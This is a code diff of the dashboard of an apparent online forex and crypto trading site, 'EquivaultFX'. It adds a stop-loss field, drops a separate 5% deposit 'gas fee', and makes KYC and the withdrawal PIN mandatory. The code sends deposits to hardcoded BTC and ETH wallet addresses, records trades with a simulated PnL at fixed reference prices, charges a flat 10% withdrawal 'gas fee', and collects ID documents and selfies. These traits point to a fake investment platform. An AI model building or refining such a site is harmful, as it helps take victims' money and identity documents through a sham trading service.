@@ -30,16 +30,13 @@ import TradingViewChart from '../components/TradingViewChart';
 import TradingViewTicker from '../components/TradingViewTicker';
 
 const SYMBOLS = [
-  { label: 'EUR/USD (Forex)', value: 'FX:EURUSD', refPrice: 1.0842 },
+  { label: 'BTC/USDT (Crypto)', value: 'BINANCE:BTCUSDT', refPrice: 60875.44 },
+  { label: 'ETH/USDT (Crypto)', value: 'BINANCE:ETHUSDT', refPrice: 1704.72 },
+  { label: 'EUR/USD (Forex)', value: 'FX:EURUSD', refPrice: 1.09806 },
   { label: 'GBP/USD (Forex)', value: 'FX:GBPUSD', refPrice: 1.2695 },
-  { label: 'BTC/USDT (Crypto)', value: 'BINANCE:BTCUSDT', refPrice: 91450.0 },
-  { label: 'ETH/USDT (Crypto)', value: 'BINANCE:ETHUSDT', refPrice: 3120.5 },
-  { label: 'Gold XAU/USD', value: 'OANDA:XAUUSD', refPrice: 2648.4 },
+  { label: 'Gold XAU/USD', value: 'OANDA:XAUUSD', refPrice: 3569.575 },
   { label: 'S&P 500 Index', value: 'FOREXCOM:SPXUSD', refPrice: 5985.2 },
 ];
-
-const BTC_FEE_WALLET = 'bc1q3yh6qpja5p05jghul86myefmtgssxegp0e6424';
-const ETH_FEE_WALLET = '0x442649Bec5815563722154d5EEDE79cCCA98aF67';
 
 const NETWORK_OPTIONS = [
   {
@@ -47,21 +44,21 @@ const NETWORK_OPTIONS = [
     name: 'Bitcoin',
     sublabel: 'BTC • ~10–30 min',
     fullLabel: 'Bitcoin (BTC Network)',
-    defaultWallet: BTC_FEE_WALLET,
+    defaultWallet: 'bc1q3yh6qpja5p05jghul86myefmtgssxegp0e6424',
   },
   {
     id: 'ETH',
     name: 'Ethereum',
     sublabel: 'ETH ERC20 • ~3–10 min',
     fullLabel: 'Ethereum (ETH ERC20)',
-    defaultWallet: ETH_FEE_WALLET,
+    defaultWallet: '0x442649Bec5815563722154d5EEDE79cCCA98aF67',
   },
   {
     id: 'ERC20',
     name: 'Tether',
     sublabel: 'USDT ERC20 • ~3–10 min',
     fullLabel: 'USDT (ERC20 — Ethereum)',
-    defaultWallet: ETH_FEE_WALLET,
+    defaultWallet: '0x442649Bec5815563722154d5EEDE79cCCA98aF67',
   },
   {
     id: 'TRC20',
@@ -75,13 +72,12 @@ const NETWORK_OPTIONS = [
     name: 'Tether',
     sublabel: 'USDT BEP20 • ~1–5 min',
     fullLabel: 'USDT (BEP20 — BNB Smart Chain)',
-    defaultWallet: ETH_FEE_WALLET,
+    defaultWallet: '0x442649Bec5815563722154d5EEDE79cCCA98aF67',
   },
 ];
 
 const DEPOSIT_PRESETS = [50, 100, 500, 1000, 5000];
 const WITHDRAW_PRESETS = [100, 500, 1000, 2500, 5000];
-const DEPOSIT_GAS_RATE = 0.05;
 const WITHDRAWAL_GAS_RATE = 0.1;
 
 export default function Dashboard({ session }) {
@@ -109,17 +105,16 @@ export default function Dashboard({ session }) {
   // Trade workspace & switcher state
   const [selectedSymbol, setSelectedSymbol] = useState(SYMBOLS[0]);
   const [orderAmount, setOrderAmount] = useState(500);
+  const [stopLoss, setStopLoss] = useState('');
   const [leverage, setLeverage] = useState('1:50');
   const [ticketMode, setTicketMode] = useState('trade');
 
   // Deposit stepper: 'amount' (1) -> 'payment' (2) -> 'complete' (3)
   const [depositStep, setDepositStep] = useState('amount');
   const [depositNetworkId, setDepositNetworkId] = useState('BTC');
-  const [depositFeeAsset, setDepositFeeAsset] = useState('BTC');
   const [depositAmt, setDepositAmt] = useState(500);
   const [depositTxHash, setDepositTxHash] = useState('');
-  const [depositFeeTxHash, setDepositFeeTxHash] = useState('');
-  const [copiedKey, setCopiedKey] = useState('');
+  const [copiedWallet, setCopiedWallet] = useState(false);
 
   // Withdraw flow
   const [withdrawNetworkId, setWithdrawNetworkId] = useState('BTC');
@@ -248,13 +243,6 @@ export default function Dashboard({ session }) {
   const activeDepositAddress =
     walletsByNetwork[depositNetwork.id] || depositNetwork.defaultWallet;
   const parsedDepositAmt = Math.max(0, Number(depositAmt) || 0);
-  const depositGasFee = Number((parsedDepositAmt * DEPOSIT_GAS_RATE).toFixed(2));
-  const totalDepositWithFee = Number((parsedDepositAmt + depositGasFee).toFixed(2));
-
-  const activeBtcFeeAddress = walletsByNetwork.BTC || BTC_FEE_WALLET;
-  const activeEthFeeAddress = walletsByNetwork.ETH || ETH_FEE_WALLET;
-  const activeFeeWalletAddress =
-    depositFeeAsset === 'ETH' ? activeEthFeeAddress : activeBtcFeeAddress;
 
   const withdrawNetwork =
     NETWORK_OPTIONS.find((n) => n.id === withdrawNetworkId) || NETWORK_OPTIONS[0];
@@ -262,11 +250,11 @@ export default function Dashboard({ session }) {
   const withdrawGasFee = Number((parsedWithdrawAmt * WITHDRAWAL_GAS_RATE).toFixed(2));
   const netWithdrawTotal = Number((parsedWithdrawAmt + withdrawGasFee).toFixed(2));
 
-  const handleCopyValue = async (value, key) => {
+  const handleCopyDepositAddress = async () => {
     try {
-      await navigator.clipboard.writeText(value);
-      setCopiedKey(key);
-      setTimeout(() => setCopiedKey(''), 2000);
+      await navigator.clipboard.writeText(activeDepositAddress);
+      setCopiedWallet(true);
+      setTimeout(() => setCopiedWallet(false), 2000);
     } catch {
       showNotice('Copy the wallet address manually from the address box.');
     }
@@ -276,6 +264,12 @@ export default function Dashboard({ session }) {
     const amt = Number(orderAmount);
     if (!amt || amt <= 0 || amt > balance) {
       showNotice('Enter a valid margin amount within your available balance.');
+      return;
+    }
+
+    const parsedSl = stopLoss !== '' ? Number(stopLoss) : null;
+    if (parsedSl !== null && (!Number.isFinite(parsedSl) || parsedSl < 0)) {
+      showNotice('Enter a valid stop loss value.');
       return;
     }
 
@@ -292,7 +286,7 @@ export default function Dashboard({ session }) {
       return;
     }
 
-    const { error: tradeErr } = await supabase.from('trades').insert({
+    const tradePayload = {
       user_id: userId,
       pair: selectedSymbol.label.split(' ')[0],
       side,
@@ -300,14 +294,21 @@ export default function Dashboard({ session }) {
       entry_price: selectedSymbol.refPrice.toLocaleString(),
       pnl: simulatedPnl,
       status: 'OPEN',
-    });
+      ...(parsedSl !== null ? { stop_loss: parsedSl } : {}),
+    };
+
+    const { error: tradeErr } = await supabase.from('trades').insert(tradePayload);
 
     if (tradeErr) {
       showNotice(tradeErr.message);
       return;
     }
 
-    showNotice(`${side} order executed for $${amt.toLocaleString()}.`);
+    showNotice(
+      `${side} order executed for $${amt.toLocaleString()}${
+        parsedSl !== null ? ` with Stop Loss at $${parsedSl.toLocaleString()}` : ''
+      }.`
+    );
     await loadUserData();
     selectTab('my-trades');
   };
@@ -341,20 +342,13 @@ export default function Dashboard({ session }) {
   };
 
   const handleConfirmDepositSent = async () => {
-    const combinedRef = [
-      depositTxHash.trim() ? `Deposit TX: ${depositTxHash.trim()}` : `Deposit Addr: ${activeDepositAddress}`,
-      depositFeeTxHash.trim()
-        ? `5% ${depositFeeAsset} Fee TX: ${depositFeeTxHash.trim()}`
-        : `5% ${depositFeeAsset} Fee Addr: ${activeFeeWalletAddress}`,
-    ].join(' | ');
-
     const { error } = await supabase.from('transactions').insert({
       user_id: userId,
-      type: `Deposit (${depositNetwork.id}) + 5% ${depositFeeAsset} Gas`,
+      type: `Deposit (${depositNetwork.id})`,
       amount: parsedDepositAmt,
-      gas_fee: depositGasFee,
+      gas_fee: 0,
       network: depositNetwork.id,
-      wallet_address: combinedRef,
+      wallet_address: depositTxHash.trim() || activeDepositAddress,
       status: 'Pending',
     });
 
@@ -364,7 +358,6 @@ export default function Dashboard({ session }) {
     }
 
     setDepositTxHash('');
-    setDepositFeeTxHash('');
     setDepositStep('complete');
     await loadUserData();
     if (isAdmin) await loadAdminData();
@@ -671,7 +664,7 @@ export default function Dashboard({ session }) {
               className={`dash-nav-btn ${activeTab === 'kyc' ? 'active' : ''}`}
               onClick={() => selectTab('kyc')}
             >
-              <ShieldCheck size={17} /> KYC (Optional)
+              <ShieldCheck size={17} /> KYC
             </button>
             <button
               className={`dash-nav-btn ${activeTab === 'settings' ? 'active' : ''}`}
@@ -828,8 +821,8 @@ export default function Dashboard({ session }) {
                   </div>
                 </div>
                 <div className="kpi-card">
-                  <div className="kpi-label">Deposit / Withdraw Gas</div>
-                  <div className="kpi-value">5% / 10%</div>
+                  <div className="kpi-label">Withdrawal Gas</div>
+                  <div className="kpi-value">10% Auto</div>
                 </div>
               </div>
 
@@ -906,7 +899,7 @@ export default function Dashboard({ session }) {
                 >
                   <strong>
                     {ticketMode === 'trade' && `Order Ticket — ${selectedSymbol.label}`}
-                    {ticketMode === 'deposit' && `Quick Deposit (${depositNetwork.id} • 5% BTC/ETH Gas)`}
+                    {ticketMode === 'deposit' && `Quick Deposit (${depositNetwork.id})`}
                     {ticketMode === 'withdraw' && `Quick Withdraw (${withdrawNetwork.id} • 10% Gas)`}
                   </strong>
 
@@ -944,6 +937,18 @@ export default function Dashboard({ session }) {
                       />
                     </div>
                     <div className="dock-field">
+                      <label className="form-label">Stop Loss (USD)</label>
+                      <input
+                        type="number"
+                        step="0.01"
+                        min="0"
+                        className="form-control tabular"
+                        placeholder="Optional stop loss"
+                        value={stopLoss}
+                        onChange={(e) => setStopLoss(e.target.value)}
+                      />
+                    </div>
+                    <div className="dock-field">
                       <label className="form-label">Leverage</label>
                       <select
                         className="form-control"
@@ -958,7 +963,12 @@ export default function Dashboard({ session }) {
                     <div className="dock-actions">
                       <button
                         type="button"
-                        className="btn btn-white"
+                        className="btn"
+                        style={{
+                          background: '#10B981',
+                          color: '#09090B',
+                          fontWeight: 700,
+                        }}
                         onClick={() => handlePlaceOrder('BUY')}
                       >
                         Buy / Long
@@ -978,7 +988,7 @@ export default function Dashboard({ session }) {
                   <div className="dock-inline-row" style={{ justifyContent: 'space-between' }}>
                     <div>
                       <div style={{ fontSize: '13px', color: 'var(--text-secondary)' }}>
-                        Deposits include a separate 5% gas fee payable in BTC or ETH to the designated fee wallet.
+                        Choose wallet, enter USD amount, copy deposit address, and submit confirmation in the full Deposit view.
                       </div>
                     </div>
                     <button
@@ -1058,6 +1068,7 @@ export default function Dashboard({ session }) {
                       <th>Side</th>
                       <th>Margin</th>
                       <th>Entry</th>
+                      <th>Stop Loss</th>
                       <th>PnL</th>
                       <th>Status</th>
                       <th>Action</th>
@@ -1066,7 +1077,7 @@ export default function Dashboard({ session }) {
                   <tbody>
                     {trades.length === 0 ? (
                       <tr>
-                        <td colSpan="7" style={{ color: 'var(--text-muted)' }}>
+                        <td colSpan="8" style={{ color: 'var(--text-muted)' }}>
                           No trades placed yet.
                         </td>
                       </tr>
@@ -1085,6 +1096,11 @@ export default function Dashboard({ session }) {
                           </td>
                           <td>${Number(tr.amount).toLocaleString()}</td>
                           <td>{tr.entry_price}</td>
+                          <td>
+                            {tr.stop_loss !== undefined && tr.stop_loss !== null
+                              ? `$${Number(tr.stop_loss).toLocaleString()}`
+                              : '—'}
+                          </td>
                           <td
                             style={{
                               color:
@@ -1124,7 +1140,7 @@ export default function Dashboard({ session }) {
                   <div>
                     <h3>Deposit Funds</h3>
                     <div style={{ fontSize: '12px', color: 'var(--text-secondary)' }}>
-                      Send deposit amount + separate 5% gas fee in BTC or ETH
+                      Fund your account directly with crypto
                     </div>
                   </div>
                   <div className="tabular" style={{ textAlign: 'right' }}>
@@ -1137,7 +1153,7 @@ export default function Dashboard({ session }) {
 
                 <div className="stepper-bar">
                   <div className={`stepper-item ${depositStep === 'amount' ? 'active' : 'done'}`}>
-                    <span>1</span> Amount &amp; Fee Asset
+                    <span>1</span> Amount
                   </div>
                   <div className="stepper-line" />
                   <div
@@ -1149,7 +1165,7 @@ export default function Dashboard({ session }) {
                           : ''
                     }`}
                   >
-                    <span>2</span> Send Payment &amp; 5% Fee
+                    <span>2</span> Send Payment
                   </div>
                   <div className="stepper-line" />
                   <div className={`stepper-item ${depositStep === 'complete' ? 'active' : ''}`}>
@@ -1160,9 +1176,9 @@ export default function Dashboard({ session }) {
                 {depositStep === 'amount' && (
                   <form onSubmit={handleCreateDepositRequest}>
                     <div className="form-group">
-                      <label className="form-label">1 • Choose Deposit Wallet</label>
+                      <label className="form-label">1 • Choose Wallet</label>
                       <div style={{ fontSize: '12px', color: 'var(--text-secondary)', marginBottom: '8px' }}>
-                        Select the currency and network for your main deposit.
+                        Select the currency and network you&apos;ll send from. Send only the selected asset on this network.
                       </div>
                       <div className="asset-choice-grid">
                         {NETWORK_OPTIONS.map((net) => {
@@ -1188,9 +1204,9 @@ export default function Dashboard({ session }) {
                     </div>
 
                     <div className="form-group">
-                      <label className="form-label">2 • Enter Deposit Amount (USD)</label>
+                      <label className="form-label">2 • Enter Amount</label>
                       <div style={{ fontSize: '12px', color: 'var(--text-secondary)', marginBottom: '8px' }}>
-                        Minimum $10.00. A separate 5% gas fee applies in BTC or ETH.
+                        Minimum $10.00.
                       </div>
                       <input
                         type="number"
@@ -1215,63 +1231,14 @@ export default function Dashboard({ session }) {
                       </div>
                     </div>
 
-                    <div className="form-group">
-                      <label className="form-label">3 • Pay Separate 5% Gas Fee In</label>
-                      <div style={{ fontSize: '12px', color: 'var(--text-secondary)', marginBottom: '8px' }}>
-                        Send the 5% gas fee separately to the dedicated BTC or ETH fee wallet.
-                      </div>
-                      <div className="asset-choice-grid" style={{ gridTemplateColumns: '1fr 1fr' }}>
-                        {[
-                          {
-                            id: 'BTC',
-                            title: 'Bitcoin (BTC)',
-                            desc: 'Send 5% fee to BTC fee wallet',
-                          },
-                          {
-                            id: 'ETH',
-                            title: 'Ethereum (ETH)',
-                            desc: 'Send 5% fee to ETH fee wallet',
-                          },
-                        ].map((feeOpt) => {
-                          const active = depositFeeAsset === feeOpt.id;
-                          return (
-                            <button
-                              key={feeOpt.id}
-                              type="button"
-                              onClick={() => setDepositFeeAsset(feeOpt.id)}
-                              className={`asset-choice-card ${active ? 'active' : ''}`}
-                            >
-                              <CurrencyIcon code={feeOpt.id} size={22} />
-                              <div>
-                                <strong>{feeOpt.title}</strong>
-                                <div style={{ fontSize: '12px', color: 'var(--text-secondary)' }}>
-                                  {feeOpt.desc}
-                                </div>
-                              </div>
-                            </button>
-                          );
-                        })}
-                      </div>
-                    </div>
-
                     <div className="summary-card tabular" style={{ marginBottom: '16px' }}>
                       <div className="summary-row">
-                        <span>Deposit Wallet</span>
+                        <span>Wallet</span>
                         <strong>{depositNetwork.id}</strong>
                       </div>
                       <div className="summary-row">
-                        <span>Deposit Amount (USD)</span>
+                        <span>Amount (USD)</span>
                         <strong>${parsedDepositAmt.toFixed(2)}</strong>
-                      </div>
-                      <div className="summary-row">
-                        <span>Separate Gas Fee (5% in {depositFeeAsset})</span>
-                        <strong style={{ color: '#fda4af' }}>
-                          ${depositGasFee.toFixed(2)} ({depositFeeAsset})
-                        </strong>
-                      </div>
-                      <div className="summary-row">
-                        <span>Total Outlay (Deposit + 5% Fee)</span>
-                        <strong>${totalDepositWithFee.toFixed(2)}</strong>
                       </div>
                       <div className="summary-row">
                         <span>Credited to Balance</span>
@@ -1293,15 +1260,15 @@ export default function Dashboard({ session }) {
                       <div style={{ display: 'inline-flex', justifyContent: 'center', marginBottom: '8px' }}>
                         <CurrencyIcon code={depositNetwork.id} size={36} />
                       </div>
-                      <h4>Send Deposit &amp; Separate 5% {depositFeeAsset} Gas Fee</h4>
+                      <h4>Send Your {depositNetwork.id}</h4>
                       <p style={{ fontSize: '12.5px', color: 'var(--text-secondary)' }}>
-                        Send ${parsedDepositAmt.toFixed(2)} in {depositNetwork.fullLabel}, and separately send ${depositGasFee.toFixed(2)} worth of {depositFeeAsset} to the {depositFeeAsset} fee wallet.
+                        Send the exact USD equivalent in {depositNetwork.fullLabel} to this address
                       </p>
                     </div>
 
                     <div className="wallet-address-box">
                       <div style={{ fontSize: '11px', color: 'var(--text-secondary)', marginBottom: '6px' }}>
-                        1 • {depositNetwork.fullLabel.toUpperCase()} DEPOSIT ADDRESS (${parsedDepositAmt.toFixed(2)})
+                        {depositNetwork.fullLabel.toUpperCase()} ADDRESS
                       </div>
                       <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: '10px' }}>
                         <code className="tabular" style={{ wordBreak: 'break-all', fontSize: '12.5px' }}>
@@ -1310,55 +1277,22 @@ export default function Dashboard({ session }) {
                         <button
                           type="button"
                           className="btn btn-outline btn-sm"
-                          onClick={() => handleCopyValue(activeDepositAddress, 'deposit')}
+                          onClick={handleCopyDepositAddress}
                         >
-                          {copiedKey === 'deposit' ? <Check size={14} /> : <Copy size={14} />}
-                          {copiedKey === 'deposit' ? 'Copied' : 'Copy'}
+                          {copiedWallet ? <Check size={14} /> : <Copy size={14} />}
+                          {copiedWallet ? 'Copied' : 'Copy'}
                         </button>
-                      </div>
-                    </div>
-
-                    <div className="wallet-address-box" style={{ marginTop: '12px', borderColor: 'var(--accent-crimson-border)' }}>
-                      <div style={{ fontSize: '11px', color: '#fda4af', marginBottom: '6px' }}>
-                        2 • SEPARATE 5% GAS FEE WALLET ({depositFeeAsset} — ${depositGasFee.toFixed(2)} USD EQUIVALENT)
-                      </div>
-                      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: '10px' }}>
-                        <code className="tabular" style={{ wordBreak: 'break-all', fontSize: '12.5px' }}>
-                          {activeFeeWalletAddress}
-                        </code>
-                        <button
-                          type="button"
-                          className="btn btn-outline btn-sm"
-                          onClick={() => handleCopyValue(activeFeeWalletAddress, 'fee')}
-                        >
-                          {copiedKey === 'fee' ? <Check size={14} /> : <Copy size={14} />}
-                          {copiedKey === 'fee' ? 'Copied' : 'Copy'}
-                        </button>
-                      </div>
-                      <div style={{ fontSize: '11.5px', color: 'var(--text-secondary)', marginTop: '8px' }}>
-                        BTC Fee Wallet: <span className="tabular">{activeBtcFeeAddress}</span> • ETH Fee Wallet: <span className="tabular">{activeEthFeeAddress}</span>
                       </div>
                     </div>
 
                     <div className="form-group" style={{ marginTop: '14px' }}>
-                      <label className="form-label">Deposit Transaction Hash / TXID (Optional)</label>
+                      <label className="form-label">Transaction Hash / TXID (Optional)</label>
                       <input
                         type="text"
                         className="form-control"
-                        placeholder="Paste main deposit TXID after sending..."
+                        placeholder="Paste transaction hash after sending..."
                         value={depositTxHash}
                         onChange={(e) => setDepositTxHash(e.target.value)}
-                      />
-                    </div>
-
-                    <div className="form-group">
-                      <label className="form-label">5% {depositFeeAsset} Gas Fee Transaction Hash / TXID (Optional)</label>
-                      <input
-                        type="text"
-                        className="form-control"
-                        placeholder={`Paste separate ${depositFeeAsset} gas fee TXID after sending...`}
-                        value={depositFeeTxHash}
-                        onChange={(e) => setDepositFeeTxHash(e.target.value)}
                       />
                     </div>
 
@@ -1368,14 +1302,8 @@ export default function Dashboard({ session }) {
                         <strong>${parsedDepositAmt.toFixed(2)}</strong>
                       </div>
                       <div className="summary-row">
-                        <span>Separate 5% gas fee ({depositFeeAsset})</span>
-                        <strong style={{ color: '#fda4af' }}>
-                          ${depositGasFee.toFixed(2)} ({depositFeeAsset})
-                        </strong>
-                      </div>
-                      <div className="summary-row">
-                        <span>Total sent across both transfers</span>
-                        <strong>${totalDepositWithFee.toFixed(2)}</strong>
+                        <span>Total to send</span>
+                        <strong>${parsedDepositAmt.toFixed(2)}</strong>
                       </div>
                     </div>
 
@@ -1393,7 +1321,7 @@ export default function Dashboard({ session }) {
                         style={{ flex: 1 }}
                         onClick={handleConfirmDepositSent}
                       >
-                        ✓ I Have Sent Deposit &amp; 5% {depositFeeAsset} Fee
+                        ✓ I Have Sent the Payment
                       </button>
                     </div>
                   </div>
@@ -1402,9 +1330,9 @@ export default function Dashboard({ session }) {
                 {depositStep === 'complete' && (
                   <div style={{ textAlign: 'center', padding: '14px 0' }}>
                     <CheckCircle2 size={36} color="#10B981" style={{ marginBottom: '10px' }} />
-                    <h4>Deposit &amp; 5% Gas Fee Submitted</h4>
+                    <h4>Deposit Submitted</h4>
                     <p style={{ fontSize: '13px', color: 'var(--text-secondary)', margin: '8px 0 18px' }}>
-                      Your ${parsedDepositAmt.toFixed(2)} ({depositNetwork.id}) deposit and ${depositGasFee.toFixed(2)} ( 5% {depositFeeAsset}) gas fee submission are now Pending confirmation.
+                      Your ${parsedDepositAmt.toFixed(2)} ({depositNetwork.id}) deposit request is now Pending confirmation.
                     </p>
                     <button
                       type="button"
@@ -1426,7 +1354,6 @@ export default function Dashboard({ session }) {
                     <thead>
                       <tr>
                         <th>Amount</th>
-                        <th>5% Fee</th>
                         <th>Method</th>
                         <th>Date</th>
                         <th>Status</th>
@@ -1435,7 +1362,7 @@ export default function Dashboard({ session }) {
                     <tbody>
                       {recentDeposits.length === 0 ? (
                         <tr>
-                          <td colSpan="5" style={{ color: 'var(--text-muted)' }}>
+                          <td colSpan="4" style={{ color: 'var(--text-muted)' }}>
                             No deposits recorded yet.
                           </td>
                         </tr>
@@ -1443,7 +1370,6 @@ export default function Dashboard({ session }) {
                         recentDeposits.map((tx) => (
                           <tr key={tx.id}>
                             <td>${Number(tx.amount).toFixed(2)}</td>
-                            <td>${Number(tx.gas_fee || 0).toFixed(2)}</td>
                             <td>{tx.network || tx.type}</td>
                             <td>{new Date(tx.created_at).toLocaleString()}</td>
                             <td>{tx.status.toUpperCase()}</td>
@@ -1464,7 +1390,7 @@ export default function Dashboard({ session }) {
                   <div>
                     <h3>Withdraw Funds</h3>
                     <div style={{ fontSize: '12px', color: 'var(--text-secondary)' }}>
-                      Withdraw to any external wallet • 10% automatic gas fee applies • KYC optional
+                      Withdraw to any external wallet • 10% automatic gas fee applies
                     </div>
                   </div>
                   <div className="tabular" style={{ textAlign: 'right' }}>
@@ -1554,7 +1480,7 @@ export default function Dashboard({ session }) {
                   </div>
 
                   <div className="form-group">
-                    <label className="form-label">4-Digit Withdrawal Security PIN (Optional if unset)</label>
+                    <label className="form-label">4-Digit Withdrawal Security PIN</label>
                     <input
                       type="password"
                       inputMode="numeric"
@@ -1694,11 +1620,11 @@ export default function Dashboard({ session }) {
           {activeTab === 'kyc' && (
             <div className="panel-card" style={{ maxWidth: '680px' }}>
               <div className="panel-header">
-                <h3>Identity Verification (KYC — Optional)</h3>
+                <h3>KYC Verification</h3>
                 <span className={`kyc-pill ${kycStatus}`}>{kycStatus.toUpperCase()}</span>
               </div>
               <p style={{ fontSize: '13px', color: 'var(--text-secondary)', marginBottom: '16px' }}>
-                KYC is optional and not required to trade, deposit, or withdraw on EquivaultFX.
+                Submit your identity document and selfie to complete KYC verification on EquivaultFX.
               </p>
 
               <form onSubmit={handleKycSubmit}>
